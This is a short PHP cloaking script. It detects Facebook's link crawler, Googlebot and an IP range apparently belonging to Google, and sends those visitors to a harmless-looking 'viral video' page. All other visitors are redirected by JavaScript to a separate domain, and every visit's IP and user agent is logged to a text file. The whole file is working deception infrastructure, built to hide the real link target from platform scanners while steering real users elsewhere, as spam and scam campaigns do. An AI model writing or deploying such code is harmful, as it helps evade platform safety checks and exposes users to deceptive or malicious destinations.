
<?php
function checkIP($ip) {
  $lowIp = ip2long('66.100.0.0');
$highIp = ip2long('66.255.255.255');
  if ($ip <= $highIp && $lowIp <= $ip) {
      return true;
  }
}
$text = "agents.txt";

$ip =  ip2long($_SERVER['REMOTE_ADDR']);
// function ip_details($ip)
// {
//     $json       = file_get_contents("http://ipinfo.io/{$ip}");
//     $details    = json_decode($json);
//     return $details;
// }

// $details = ip_details($ip);
// $country = $details->country;
if (
   strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
 strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
  $fAgent = fopen($text, 'a');
  $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] .' blocked ' . PHP_EOL;
  fwrite($fAgent, $agent);
  fclose($fAgent);
  header('Location: http://newviralvideo.com/ang-laswa-ng-trip-nyo.html', true, 301);
die();

 }
else {
  $fAgent = fopen($text, 'a');
  $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] .' ok ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    echo "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = 'http://vmnet.info';
// ]]></script>
";
    die();
}
?>
